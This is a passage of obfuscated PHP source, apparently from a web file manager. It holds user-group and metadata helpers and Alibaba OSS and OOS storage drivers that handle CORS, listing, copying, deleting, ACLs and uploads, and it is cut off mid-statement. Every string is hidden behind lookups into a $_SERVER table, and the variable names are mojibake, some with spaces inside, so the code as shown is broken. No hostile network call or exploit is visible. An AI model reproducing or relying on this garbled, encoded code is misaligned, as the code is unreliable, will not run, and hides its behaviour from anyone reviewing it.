$â‰¾úäş = array_to_keyvalue($ŞÑª×ˆÆ, $³¶œ‘¹[12], $³¶œ‘¹[1665]); $this->_listAppendGroup($ŞÑª×ˆÆ, $â‰¾úäş); $this->_listAppendMeta($ŞÑª×ˆÆ, $â‰¾úäş); $this->_listAppendSourceRoot($ŞÑª×ˆÆ, $â‰¾úäş); } private function _listAppendSourceRoot(&$†ûåñù, $¬Ô¼ø¥à) { $ÕÑ¶¹ÀÆ =& $_SERVER[Ó¡Ÿ§‚]; $¨‘Õç× = Model($ÕÑ¶¹ÀÆ[824])->listSourceRoot(SourceModel::TYPE_USER, $¬Ô¼ø¥à); $¨‘Õç× = array_to_keyvalue($¨‘Õç×, $ÕÑ¶¹ÀÆ[505]); $¨‘Õç× = array_remove_key($¨‘Õç×, $ÕÑ¶¹ÀÆ[505]); foreach ($†ûåñù as &$·ä±À•Û) { $·ä±À•Û[$ÕÑ¶¹ÀÆ[87]] = $¨‘Õç×[$·ä±À•Û[$ÕÑ¶¹ÀÆ[1665]]] ? $¨‘Õç×[$·ä±À•Û[$ÕÑ¶¹ÀÆ[1665]]] : array(); } unset($·ä±À•Û); } private function _listAppendGroup(&$äÍ‰œ»§, $ô¶‡¡½) { $şß»ºõ¤ =& $_SERVER[Ó¡Ÿ§‚]; $Ëâß Şù = array($şß»ºõ¤[1665] => array($şß»ºõ¤[7], $ô¶‡¡½)); $Óá“ô« = Model($şß»ºõ¤[1944])->where($Ëâß Şù)->select(); $ß”½Îª« = array_to_keyvalue($Óá“ô«, $şß»ºõ¤[12], $şß»ºõ¤[1854]); $ß”½Îª« = array_remove_value(array_unique($ß”½Îª«), $şß»ºõ¤[198]); if (!$ß”½Îª« || !$Óá“ô«) { return; } $Ëâß Şù = array($şß»ºõ¤[1854] => array($şß»ºõ¤[7], $ß”½Îª«)); $Õğ´¼ëó = Model($şß»ºõ¤[2039])->field($şß»ºõ¤[2341])->where($Ëâß Şù)->select(); $Õğ´¼ëó = array_to_keyvalue($Õğ´¼ëó, $şß»ºõ¤[1854]); $Óá“ô« = array_to_keyvalue_group($Óá“ô«, $şß»ºõ¤[1665]); foreach ($Óá“ô« as &$É™ˆòšï) { $“Âº“ò· = array(); foreach ($É™ˆòšï as $‹é“¹Âê) { if (!$‹é“¹Âê[$şß»ºõ¤[1958]]) { continue; } $›­«İè† = Model($şß»ºõ¤[507])->listData($‹é“¹Âê[$şß»ºõ¤[1958]]); $“Âº“ò·[] = array($şß»ºõ¤[1854] => $‹é“¹Âê[$şß»ºõ¤[1854]], $şß»ºõ¤[2342] => $Õğ´¼ëó[$‹é“¹Âê[$şß»ºõ¤[1854]]][$şß»ºõ¤[32]], $şß»ºõ¤[520] => $Õğ´¼ëó[$‹é“¹Âê[$şß»ºõ¤[1854]]][$şß»ºõ¤[520]], $şß»ºõ¤[422] => $›­«İè†); } $É™ˆòšï = $“Âº“ò·; } unset($É™ˆòšï); foreach ($äÍ‰œ»§ as &$†¬º”×Ğ) { $†¬º”×Ğ[$şß»ºõ¤[2041]] = array(); if (isset($Óá“ô«[$†¬º”×Ğ[$şß»ºõ¤[1665]]])) { $†¬º”×Ğ[$şß»ºõ¤[2041]] = $Óá“ô«[$†¬º”×Ğ[$şß»ºõ¤[1665]]]; } } unset($†¬º”×Ğ); } public function userAppendGroup($ ÛÑ”„) { $¸’Ë¤Íö =& $_SERVER[Ó¡Ÿ§‚]; if (!$ ÛÑ”„) { return array(); } $this->_listAppendGroup($ ÛÑ”„, array_to_keyvalue($ ÛÑ”„, $¸’Ë¤Íö[12], $¸’Ë¤Íö[1665])); return $ ÛÑ”„; } private function _listAppendMeta(&$¥‡ÎÓÁ’, $æÂÔ™ŞŸ) { $ÊŞÂÅî¤ =& $_SERVER[Ó¡Ÿ§‚]; $½¡Ëº“Û = UserJobModel::JOB_KEY; $‹“¿—‚ = array($ÊŞÂÅî¤[2322]); $®å¤ŠıĞ = array($ÊŞÂÅî¤[1665] => array($ÊŞÂÅî¤[7], $æÂÔ™ŞŸ)); $øÀª¿ø¤ = Model($ÊŞÂÅî¤[2320])->where($®å¤ŠıĞ)->select(); $øÀª¿ø¤ = array_to_keyvalue_group($øÀª¿ø¤, $ÊŞÂÅî¤[1665]); foreach ($øÀª¿ø¤ as &$–Ù°Ø«Í) { $Èİ¤îÊ = array(); foreach ($–Ù°Ø«Í as $ì™Ç…»Û) { if (!in_array($ì™Ç…»Û[$ÊŞÂÅî¤[94]], $‹“¿—‚)) { $Èİ¤îÊ[$ì™Ç…»Û[$ÊŞÂÅî¤[94]]] = $ì™Ç…»Û[$ÊŞÂÅî¤[374]]; } } $–Ù°Ø«Í = $Èİ¤îÊ; } unset($–Ù°Ø«Í); $ë‘©“Ï = Model($ÊŞÂÅî¤[2343]); foreach ($¥‡ÎÓÁ’ as &$öšŒÆ·ø) { $›†¾è¡¬ = array(); if (isset($øÀª¿ø¤[$öšŒÆ·ø[$ÊŞÂÅî¤[1665]]])) { $›†¾è¡¬ = $øÀª¿ø¤[$öšŒÆ·ø[$ÊŞÂÅî¤[1665]]]; } $öšŒÆ·ø[$ÊŞÂÅî¤[2344]] = array(); if (isset($›†¾è¡¬[$½¡Ëº“Û])) { $öšŒÆ·ø[$ÊŞÂÅî¤[2344]] = $ë‘©“Ï->getUserJobInfo($›†¾è¡¬[$½¡Ëº“Û]); } } unset($öšŒÆ·ø); } protected function groupUserAll($ˆ¬”ä”) { $Çç¬Äş² =& $_SERVER[Ó¡Ÿ§‚]; if (!$ˆ¬”ä”) { return !1; } $•Œ¡´é¹ = Model($Çç¬Äş²[1944])->field($Çç¬Äş²[1665])->where(array($Çç¬Äş²[1854] => array($Çç¬Äş²[7], $ˆ¬”ä”)))->select(); $•Œ¡´é¹ = array_to_keyvalue($•Œ¡´é¹, $Çç¬Äş²[12], $Çç¬Äş²[1665]); return array_unique($•Œ¡´é¹); } public function userSearch($ïÁÙÃÓ, $ÆÎ½»›§ = "\52") { return Model($_SERVER[Ó¡Ÿ§‚][534])->where($ïÁÙÃÓ)->field($ÆÎ½»›§)->find(); } } $_file = $_SERVER[$_SERVER[Ó¡Ÿ§‚][409]]; $_size = $_SERVER[Ó¡Ÿ§‚][875]; goto B×»§˜ÌÎ›; aá¿ºÍÊËŸ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($úˆÕíˆ†) { parent::__construct($úˆÕíˆ†); $this->signatureVersion($_SERVER[Ó¡Ÿ§‚][216]); } public function fileOutLink($œÑßœ¯¬) { $ĞŞÊ¨³ =& $_SERVER[Ó¡Ÿ§‚]; if (substr($œÑßœ¯¬, 0, 7) == $ĞŞÊ¨³[1336]) { $œÑßœ¯¬ = $ĞŞÊ¨³[1337] . substr($œÑßœ¯¬, 7); } header($ĞŞÊ¨³[161] . $œÑßœ¯¬); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ã—ôÀ‚‡) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ó¡Ÿ§‚][1393]; $this->_init($ã—ôÀ‚‡); } public function _init($İÍ”Š­ß) { $Á³ó´³ß =& $_SERVER[Ó¡Ÿ§‚]; $this->config = $İÍ”Š­ß; foreach ($İÍ”Š­ß as $Òù×µÎË => $Ø¥‰¥Ïß) { if (isset($this->{$Òù×µÎË})) { $this->{$Òù×µÎË} = $Ø¥‰¥Ïß; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Á³ó´³ß[1394] . LNG($Á³ó´³ß[1395])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $€î¼ôŠÙ =& $_SERVER[Ó¡Ÿ§‚]; $†å¥ê¬¼ = new OSS\Model\CorsConfig(); $˜‚Û–ÙĞ = new OSS\Model\CorsRule(); $˜‚Û–ÙĞ->addAllowedOrigin($€î¼ôŠÙ[1396]); $˜‚Û–ÙĞ->addAllowedMethod($€î¼ôŠÙ[1397]); $˜‚Û–ÙĞ->addAllowedMethod($€î¼ôŠÙ[1398]); $˜‚Û–ÙĞ->addAllowedMethod($€î¼ôŠÙ[1399]); $˜‚Û–ÙĞ->addAllowedMethod($€î¼ôŠÙ[1400]); $˜‚Û–ÙĞ->addAllowedMethod($€î¼ôŠÙ[160]); $˜‚Û–ÙĞ->setMaxAgeSeconds(600); $˜‚Û–ÙĞ->addExposeHeader($€î¼ôŠÙ[1401]); $˜‚Û–ÙĞ->addAllowedHeader($€î¼ôŠÙ[1396]); $†å¥ê¬¼->addRule($˜‚Û–ÙĞ); try { $this->client->putBucketCors($this->bucket, $†å¥ê¬¼); } catch (OSS\Core\OssException $ì©ƒøé) { return !1; } return !0; } public function getBucketCors() { $ˆèø‹Ä÷ =& $_SERVER[Ó¡Ÿ§‚]; $æÉîŠ•® = null; try { $æÉîŠ•® = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $²’…°ıÕ) { return null; } if (!$æÉîŠ•® || !($’ÜÖÔå” = $æÉîŠ•®->getRules())) { return null; } $âºšòü¶ = $’ÜÖÔå”[0]->getAllowedOrigins(); $¸ıß‰¯‡ = $’ÜÖÔå”[0]->getAllowedMethods(); $ú¶ƒÁƒú = $’ÜÖÔå”[0]->getMaxAgeSeconds(); $ŒÅõ£Ô = $’ÜÖÔå”[0]->getExposeHeaders(); $ù¡û²Œì = $’ÜÖÔå”[0]->getAllowedHeaders(); return array($ˆèø‹Ä÷[188] => isset($âºšòü¶[0]) ? $âºšòü¶[0] : $ˆèø‹Ä÷[12], $ˆèø‹Ä÷[192] => $¸ıß‰¯‡, $ˆèø‹Ä÷[1402] => $ú¶ƒÁƒú, $ˆèø‹Ä÷[1403] => isset($ŒÅõ£Ô[0]) ? $ŒÅõ£Ô[0] : $ˆèø‹Ä÷[12], $ˆèø‹Ä÷[190] => isset($ù¡û²Œì[0]) ? $ù¡û²Œì[0] : $ˆèø‹Ä÷[12]); } public function isBucketCors() { $¿¶üº—û =& $_SERVER[Ó¡Ÿ§‚]; $É = $this->getBucketCors(); if (!$É || !is_array($É)) { return !1; } if ($É[$¿¶üº—û[188]] != $¿¶üº—û[189] || $É[$¿¶üº—û[190]] != $¿¶üº—û[189]) { return !1; } $Æ˜ä»Û = array_map($¿¶üº—û[191], $É[$¿¶üº—û[192]]); if (!is_array($Æ˜ä»Û)) { $Æ˜ä»Û = array(); } $œÍß¨Áµ = array($¿¶üº—û[193], $¿¶üº—û[194], $¿¶üº—û[195], $¿¶üº—û[196], $¿¶üº—û[197]); $êİô¦´÷ = array_diff($œÍß¨Áµ, $Æ˜ä»Û); return empty($êİô¦´÷); } public function mkfile($™ßĞì²ª, $ ¾š£Ò› = '', $Ù¬Ğùã = REPEAT_RENAME) { $çµÑê = $this->setContent($™ßĞì²ª, $ ¾š£Ò›); if ($çµÑê !== !1) { return $this->getPathOuter($™ßĞì²ª); } return !1; } public function mkdir($ÕÃ‚³ÒŞ, $­† ïÄÅ = REPEAT_SKIP) { if ($­† ïÄÅ && $this->_isFolder($ÕÃ‚³ÒŞ)) { return $this->getPathOuter($ÕÃ‚³ÒŞ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÕÃ‚³ÒŞ)); } catch (OSS\Core\OssException $µîÁô‹Û) { return !1; } return $this->getPathOuter($ÕÃ‚³ÒŞ); } private function fileList($î†çË•ä, $ïöô¬úÎ = '', $ïÇÇŠ¢ = 0) { $‡Şº®÷¸ =& $_SERVER[Ó¡Ÿ§‚]; $î†çË•ä = trim($î†çË•ä, $‡Şº®÷¸[8]); $ÍçÀ…‚ï = empty($î†çË•ä) && $î†çË•ä !== $‡Şº®÷¸[198] ? $‡Şº®÷¸[12] : $î†çË•ä . $‡Şº®÷¸[8]; $Â– ª×£ = $‡Şº®÷¸[12]; $šİ–Ì¶å = 1000; $ùÌ³şŒ = $Ûïˆùœ” = array(); while (!0) { check_abort(); $¸™î¦»… = array($‡Şº®÷¸[1404] => $ïöô¬úÎ, $‡Şº®÷¸[1405] => $ÍçÀ…‚ï, $‡Şº®÷¸[1406] => $šİ–Ì¶å, $‡Şº®÷¸[1407] => $Â– ª×£); try { $¼°¥’ = $this->client->listObjects($this->bucket, $¸™î¦»…); } catch (OSS\Core\OssException $´·Ó†Âû) { break; } $Â– ª×£ = $¼°¥’->getNextMarker(); $Œ„úş³¯ = $¼°¥’->getObjectList(); $Íè¨Ó‰ = $¼°¥’->getPrefixList(); foreach ($Œ„úş³¯ as $÷ÔĞíÄ) { if ($÷ÔĞíÄ->getKey() == $ÍçÀ…‚ï) { continue; } $ÊĞ¦óß… = $÷ÔĞíÄ->getKey(); $÷Âµ÷– = $÷ÔĞíÄ->getSize(); $ƒàñ–¤Ò = $÷ÔĞíÄ->getLastModified(); $ò­€¾Œ = $ïÇÇŠ¢ ? array($‡Şº®÷¸[32] => $ÊĞ¦óß…, $‡Şº®÷¸[76] => $÷Âµ÷–, $‡Şº®÷¸[180] => strtotime($ƒàñ–¤Ò)) : $ÊĞ¦óß…; $Œíï—¦ı = $÷Âµ÷– == 0 && substr($ÊĞ¦óß…, strlen($ÊĞ¦óß…) - 1, 1) == $‡Şº®÷¸[8] ? !0 : !1; $¬›¹ À§ = array($‡Şº®÷¸[76] => $÷Âµ÷–, $‡Şº®÷¸[1408] => $÷Âµ÷–, $‡Şº®÷¸[85] => strtotime($ƒàñ–¤Ò), $‡Şº®÷¸[1409] => $ƒàñ–¤Ò); $this->cacheMethodInfoSet($ÊĞ¦óß…, $Œíï—¦ı, $¬›¹ À§); if ($Œíï—¦ı) { $ùÌ³şŒ[] = $ÊĞ¦óß…; continue; } $Ûïˆùœ”[] = $ò­€¾Œ; } foreach ($Íè¨Ó‰ as $Äê¿ÂÛ¤) { $ùÌ³şŒ[] = $Äê¿ÂÛ¤->getPrefix(); $this->cacheMethodInfoSet($Äê¿ÂÛ¤->getPrefix(), !0); } if ($Â– ª×£ === $‡Şº®÷¸[12]) { break; } } $this->cacheMethodInfoSet($î†çË•ä, !0); return array($‡Şº®÷¸[82] => $ùÌ³şŒ, $‡Şº®÷¸[83] => $Ûïˆùœ”); } public function copyFile($¸ËñÄ¿, $è½€¸ÓÏ) { $®·êô×» = $this->size($¸ËñÄ¿); if ($®·êô×» < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¸ËñÄ¿, $this->bucket, $this->pathEncode($è½€¸ÓÏ)); } catch (OSS\Core\OssException $¥ø¿Å÷¯) { return !1; } return $this->getPathOuter($è½€¸ÓÏ); } $ëèÑ“± = $this->multiCopyObject($¸ËñÄ¿, $è½€¸ÓÏ, $®·êô×»); return $ëèÑ“± ? $this->getPathOuter($è½€¸ÓÏ) : !1; } private function multiCopyObject($ªÊ®à½, $ŞœÎ›”Ã, $êü¼—) { $ûÔÉ–İÇ =& $_SERVER[Ó¡Ÿ§‚]; try { $ËÃª‡á¶ = array(); if ($¹°€â¯ş = $this->hashMd5($ªÊ®à½)) { $ËÃª‡á¶ = array(OSS\OssClient::OSS_HEADERS => array($ûÔÉ–İÇ[1410] => $¹°€â¯ş)); } $¹ìµ¸ÜÁ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŞœÎ›”Ã), $ËÃª‡á¶); $‹óŒé¡ = 1; $é¯æ¤‚Ò = 0; $¦¬ñ°¯ô = array(); $šš•êÀİ = 1024 * 1024 * 10; $Ùæ…ÛĞ = $this->client->generateMultiuploadParts($êü¼—, $šš•êÀİ); foreach ($Ùæ…ÛĞ as $‰ç„ï¦š => $ğµí—°) { $ÚÃÌŞ¥× = $é¯æ¤‚Ò + (int) $ğµí—°[$ûÔÉ–İÇ[1411]]; $øË‘íöÀ = (int) $ğµí—°[$ûÔÉ–İÇ[337]] + $ÚÃÌŞ¥× - 1; $å¯•¢ë = array($ûÔÉ–İÇ[1412] => $ÚÃÌŞ¥×, $ûÔÉ–İÇ[1413] => $øË‘íöÀ); $¦¬ñ°¯ô[] = $this->client->uploadPartCopy($this->bucket, $ªÊ®à½, $this->bucket, $this->pathEncode($ŞœÎ›”Ã), $‹óŒé¡, $¹ìµ¸ÜÁ, $å¯•¢ë); $‹óŒé¡ = $‹óŒé¡ + 1; } $Ïğôœëã = array(); foreach ($¦¬ñ°¯ô as $‰ç„ï¦š => $°ü€¶úÀ) { $Ïğôœëã[] = array($ûÔÉ–İÇ[1414] => $‰ç„ï¦š + 1, $ûÔÉ–İÇ[1415] => $°ü€¶úÀ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ŞœÎ›”Ã), $¹ìµ¸ÜÁ, $Ïğôœëã); } catch (OSS\Core\OssException $í£¯ıı†) { return !1; } return !0; } public function moveFile($ƒ×¾¹ÏÉ, $­ÌâÜ¶‚) { if ($this->copyFile($ƒ×¾¹ÏÉ, $­ÌâÜ¶‚)) { $this->remove($ƒ×¾¹ÏÉ); return $this->getPathOuter($­ÌâÜ¶‚); } return !1; } public function delFile($™©·§Í) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($™©·§Í)); } catch (OSS\Core\OssException $‘´à´Ïù) { return !1; } return !0; } public function delFolder($—Çœ‡µ¿) { $üãÊ±Şğ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->exist($—Çœ‡µ¿)) { return !0; } $this->listItemCache = !1; $ã¹¦²Òà = $this->fileList($—Çœ‡µ¿); $this->listItemCache = !0; $ß¡Œ„”À = trim($—Çœ‡µ¿, $üãÊ±Şğ[8]) . $üãÊ±Şğ[8]; if (!empty($—Çœ‡µ¿) && $—Çœ‡µ¿ !== $üãÊ±Şğ[198] && !in_array($ß¡Œ„”À, $ã¹¦²Òà[$üãÊ±Şğ[82]])) { $ã¹¦²Òà[$üãÊ±Şğ[82]][] = $ß¡Œ„”À; } $ÁÅ™ş†É = $this->delByBatch($ã¹¦²Òà[$üãÊ±Şğ[83]]); if (!$ÁÅ™ş†É) { return !1; } $ÁÅ™ş†É = $this->delByBatch($ã¹¦²Òà[$üãÊ±Şğ[82]]); if (!$ÁÅ™ş†É) { return !1; } return $this->delFile($ß¡Œ„”À); } private function delByBatch($Âö±°äî) { foreach (array_chunk($Âö±°äî, 1000) as $ª—“À¡ƒ) { try { $this->client->deleteObjects($this->bucket, $ª—“À¡ƒ); } catch (OSS\Core\OssException $ôÌÆÓØ) { return !1; } } return !0; } public function rename($¸ÆĞ½ş, $ßˆåÂÉ´) { return $this->renameObject($¸ÆĞ½ş, $ßˆåÂÉ´); } private function fileInfo($ì°Œã‰À, $¨¼í…êª = false, $ŞñªŞÂ = array()) { $¶³®ªÈ’ =& $_SERVER[Ó¡Ÿ§‚]; $ìè¿ÊÕÖ = array($¶³®ªÈ’[32] => $this->pathThis($ì°Œã‰À), $¶³®ªÈ’[84] => $this->getPathOuter($ì°Œã‰À), $¶³®ªÈ’[33] => $¶³®ªÈ’[200], $¶³®ªÈ’[76] => isset($ŞñªŞÂ[$¶³®ªÈ’[76]]) ? $ŞñªŞÂ[$¶³®ªÈ’[76]] : 0, $¶³®ªÈ’[174] => $this->ext($ì°Œã‰À)); if ($¨¼í…êª) { return $ìè¿ÊÕÖ; } $ìè¿ÊÕÖ[$¶³®ªÈ’[201]] = $ìè¿ÊÕÖ[$¶³®ªÈ’[85]] = 0; $ìè¿ÊÕÖ[$¶³®ªÈ’[202]] = $ìè¿ÊÕÖ[$¶³®ªÈ’[203]] = !0; if (empty($ŞñªŞÂ)) { $Ï–Õ¹Ôƒ = $this->objectMeta($ì°Œã‰À); if (!$Ï–Õ¹Ôƒ) { return $ìè¿ÊÕÖ; } $ŞñªŞÂ = array($¶³®ªÈ’[85] => strtotime($Ï–Õ¹Ôƒ[$¶³®ªÈ’[1409]]), $¶³®ªÈ’[76] => $Ï–Õ¹Ôƒ[$¶³®ªÈ’[1408]] + 0); } if (isset($ŞñªŞÂ[$¶³®ªÈ’[76]])) { $ìè¿ÊÕÖ[$¶³®ªÈ’[76]] = $ŞñªŞÂ[$¶³®ªÈ’[76]]; } if (isset($ŞñªŞÂ[$¶³®ªÈ’[85]])) { $ìè¿ÊÕÖ[$¶³®ªÈ’[85]] = $ŞñªŞÂ[$¶³®ªÈ’[85]]; } if (isset($ŞñªŞÂ[$¶³®ªÈ’[180]]) && !trim($ìè¿ÊÕÖ[$¶³®ªÈ’[85]])) { $ìè¿ÊÕÖ[$¶³®ªÈ’[85]] = $ŞñªŞÂ[$¶³®ªÈ’[180]]; } return $ìè¿ÊÕÖ; } private function folderInfo($ˆûÖ¼‹, $–ÈÏÔƒ = false, $”ØÓÁì± = array()) { $‰‹’Ò†à =& $_SERVER[Ó¡Ÿ§‚]; $æ«â¸…ù = array($‰‹’Ò†à[32] => $this->pathThis($ˆûÖ¼‹), $‰‹’Ò†à[84] => $this->getPathOuter($‰‹’Ò†à[8] . $ˆûÖ¼‹), $‰‹’Ò†à[33] => $‰‹’Ò†à[75]); if ($–ÈÏÔƒ) { return $æ«â¸…ù; } $æ«â¸…ù[$‰‹’Ò†à[201]] = $æ«â¸…ù[$‰‹’Ò†à[85]] = 0; $æ«â¸…ù[$‰‹’Ò†à[202]] = $æ«â¸…ù[$‰‹’Ò†à[203]] = !0; if (empty($”ØÓÁì±)) { $ˆûÖ¼‹ = rtrim($ˆûÖ¼‹, $‰‹’Ò†à[8]) . $‰‹’Ò†à[8]; $Ÿ¸ÂËÒ’ = $this->objectMeta($ˆûÖ¼‹); if (!$Ÿ¸ÂËÒ’) { return $æ«â¸…ù; } $”ØÓÁì± = array($‰‹’Ò†à[201] => $Ÿ¸ÂËÒ’[$‰‹’Ò†à[511]][$‰‹’Ò†à[1416]], $‰‹’Ò†à[85] => strtotime($Ÿ¸ÂËÒ’[$‰‹’Ò†à[1409]])); } if (isset($”ØÓÁì±[$‰‹’Ò†à[85]])) { $æ«â¸…ù[$‰‹’Ò†à[85]] = $”ØÓÁì±[$‰‹’Ò†à[85]]; } if (isset($”ØÓÁì±[$‰‹’Ò†à[201]])) { $æ«â¸…ù[$‰‹’Ò†à[201]] = $”ØÓÁì±[$‰‹’Ò†à[201]]; } return $æ«â¸…ù; } public function listPath($Ù»¬‡„ğ, $Æ¿ÀÇóê = false) { $§Ç†Úß¤ =& $_SERVER[Ó¡Ÿ§‚]; $á¥™¼”ş = $this->fileList($Ù»¬‡„ğ, $§Ç†Úß¤[8], !0); foreach ($á¥™¼”ş[$§Ç†Úß¤[82]] as $Ûğˆèöì => $Ô¼ñÙü) { $á¥™¼”ş[$§Ç†Úß¤[82]][$Ûğˆèöì] = $this->folderInfo($Ô¼ñÙü, $Æ¿ÀÇóê, $Ô¼ñÙü); } foreach ($á¥™¼”ş[$§Ç†Úß¤[83]] as $Ûğˆèöì => $Ô¼ñÙü) { $á¥™¼”ş[$§Ç†Úß¤[83]][$Ûğˆèöì] = $this->fileInfo($Ô¼ñÙü[$§Ç†Úß¤[32]], $Æ¿ÀÇóê, $Ô¼ñÙü); } return $á¥™¼”ş; } protected function infoChildren($’£‘ñå£, &$œˆñ«›Î) { $±Ê–±Å† =& $_SERVER[Ó¡Ÿ§‚]; $á¿‡à™Ú = $this->fileList($’£‘ñå£, $±Ê–±Å†[12], !0); $œˆñ«›Î[$±Ê–±Å†[78]] += count($á¿‡à™Ú[$±Ê–±Å†[82]]); $œˆñ«›Î[$±Ê–±Å†[77]] += count($á¿‡à™Ú[$±Ê–±Å†[83]]); foreach ($á¿‡à™Ú[$±Ê–±Å†[83]] as $ìÍ˜øñ) { if (!$ìÍ˜øñ || !$ìÍ˜øñ[$±Ê–±Å†[76]]) { continue; } $œˆñ«›Î[$±Ê–±Å†[76]] += $ìÍ˜øñ[$±Ê–±Å†[76]]; } } public function has($Îö°£¶œ, $ÂÇ‡†ä = false, $î£½§çÔ = true) { $É°îœóş =& $_SERVER[Ó¡Ÿ§‚]; $Îö°£¶œ = trim($Îö°£¶œ, $É°îœóş[8]); $¸û„±½¾ = empty($Îö°£¶œ) && $Îö°£¶œ !== $É°îœóş[198] ? $É°îœóş[12] : $Îö°£¶œ . $É°îœóş[8]; $şù¬·¨¢ = $É°îœóş[12]; $»¿Ç¤ = 500; $„‘µ–…¦ = $”£Ê¼÷ = 0; while (!0) { check_abort(); $³­ı Á³ = array($É°îœóş[1404] => $É°îœóş[8], $É°îœóş[1405] => $¸û„±½¾, $É°îœóş[1406] => $»¿Ç¤, $É°îœóş[1407] => $şù¬·¨¢); try { $¼ĞÈ‹åá = $this->client->listObjects($this->bucket, $³­ı Á³); } catch (OSS\Core\OssException $á—±Ñ‚Ç) { break; } $şù¬·¨¢ = $¼ĞÈ‹åá->getNextMarker(); $Æ£öá§¢ = $¼ĞÈ‹åá->getObjectList(); $µ½ç’Ì = $¼ĞÈ‹åá->getPrefixList(); if ($ÂÇ‡†ä) { if (count($Æ£öá§¢) > 1 || count($Æ£öá§¢) == 1 && $Æ£öá§¢[0]->getKey() != $¸û„±½¾) { $„‘µ–…¦ += count($Æ£öá§¢) - 1; } if (!empty($µ½ç’Ì)) { $”£Ê¼÷ += count($µ½ç’Ì); } if ($şù¬·¨¢ === $É°îœóş[12]) { break; } continue; } if ($î£½§çÔ) { if (!empty($Æ£öá§¢)) { if (count($Æ£öá§¢) > 1 || $Æ£öá§¢[0]->getKey() != $¸û„±½¾) { return !0; } } } else { if (!empty($µ½ç’Ì)) { return !0; } } if ($şù¬·¨¢ === $É°îœóş[12]) { break; } } if ($ÂÇ‡†ä) { return array($É°îœóş[207] => $„‘µ–…¦, $É°îœóş[208] => $”£Ê¼÷); } return !1; } public function listAll($¼¶­Û´—) { $¥ÍâĞ‚— =& $_SERVER[Ó¡Ÿ§‚]; $Ü¶ÒäÏÖ = $this->fileList($¼¶­Û´—, $¥ÍâĞ‚—[12], !0); $å¶Ù“™ = array_to_keyvalue($Ü¶ÒäÏÖ[$¥ÍâĞ‚—[83]], $¥ÍâĞ‚—[32]); foreach ($Ü¶ÒäÏÖ[$¥ÍâĞ‚—[82]] as $®â´ºâ¸) { if (is_string($®â´ºâ¸)) { $å¶Ù“™[$®â´ºâ¸] = array($¥ÍâĞ‚—[76] => 0); } } return $this->listAllFiles($¼¶­Û´—, $å¶Ù“™); } public function canRead($æı¸½Êƒ) { $½ë‘‡À· =& $_SERVER[Ó¡Ÿ§‚]; $¤¢ÏÈ˜ = $this->pathAcl($æı¸½Êƒ); return $¤¢ÏÈ˜ == $½ë‘‡À·[1417] || $¤¢ÏÈ˜ == $½ë‘‡À·[556] ? !0 : !1; } public function canWrite($òû¥ÌÖ) { $ôÄÁ„Ñó = $this->pathAcl($òû¥ÌÖ); return $ôÄÁ„Ñó == $_SERVER[Ó¡Ÿ§‚][556] ? !0 : !1; } public function pathAcl($Ãç¯æ) { $»Ó›¯½ì =& $_SERVER[Ó¡Ÿ§‚]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¡ªÅü¨ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ãç¯æ)); } catch (OSS\Core\OssException $üê»Ğ¬ú) { return !1; } $†×¢ê…î = $¡ªÅü¨ == $»Ó›¯½ì[37] ? $this->bucketAcl : $¡ªÅü¨; if ($†×¢ê…î == $»Ó›¯½ì[1418]) { return $»Ó›¯½ì[1417]; } if ($†×¢ê…î == $»Ó›¯½ì[1419]) { return $»Ó›¯½ì[556]; } return $†×¢ê…î; } private function chmodPath($„öÅëµØ, $Ë„Ëçƒ  = '') { $†‘Šíª =& $_SERVER[Ó¡Ÿ§‚]; $îı¥“åı = empty($Ë„Ëçƒ ) ? $†‘Šíª[1419] : $Ë„Ëçƒ ; $Ìñæ»çÊ = array($†‘Šíª[37], $†‘Šíª[199], $†‘Šíª[1418], $†‘Šíª[1419]); if (!in_array($îı¥“åı, $Ìñæ»çÊ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($„öÅëµØ), $îı¥“åı); } catch (OSS\Core\OssException $«½¨œ¥°) { return !1; } return !0; } public function getContent($¥”¨Œ´ó) { return $this->fileSubstr($¥”¨Œ´ó, -1); } public function setContent($ÛàÂë«ä, $Šúº…² = '') { $òóãƒĞÑ =& $_SERVER[Ó¡Ÿ§‚]; try { $Ô…œØöü = $this->trafficLimit($òóãƒĞÑ[1420]); $ÈƒĞÏ®Ç = $this->client->putObject($this->bucket, $this->pathEncode($ÛàÂë«ä), $Šúº…², $Ô…œØöü); } catch (OSS\Core\OssException $îĞ”ó¿) { return !1; } $Ê¶·ëÊ” = array($òóãƒĞÑ[1410] => trim($ÈƒĞÏ®Ç[$òóãƒĞÑ[1421]], $òóãƒĞÑ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÛàÂë«ä))); $this->updateObjMeta($ÛàÂë«ä, $Ê¶·ëÊ”); return isset($ÈƒĞÏ®Ç[$òóãƒĞÑ[1422]][$òóãƒĞÑ[1369]]) ? !0 : !1; } private function updateObjMeta($¤à¼ùÆ, $ß²Š¨ô) { $¤à¼ùÆ = $this->pathEncode($¤à¼ùÆ); try { $¨¸ÒÊşÇ = array(OSS\OssClient::OSS_HEADERS => $ß²Š¨ô); $this->client->copyObject($this->bucket, $¤à¼ùÆ, $this->bucket, $¤à¼ùÆ, $¨¸ÒÊşÇ); } catch (OSS\Core\OssException $•àãàÜÁ) { return !1; } return !0; } public function upload($¨…ÅõêÅ, $ÒöâğÎØ, $­Ö’Š§Ü = false, $¾¸å®× = REPEAT_REPLACE) { $èà ±¾Õ =& $_SERVER[Ó¡Ÿ§‚]; $ÈÈÂ…İ = 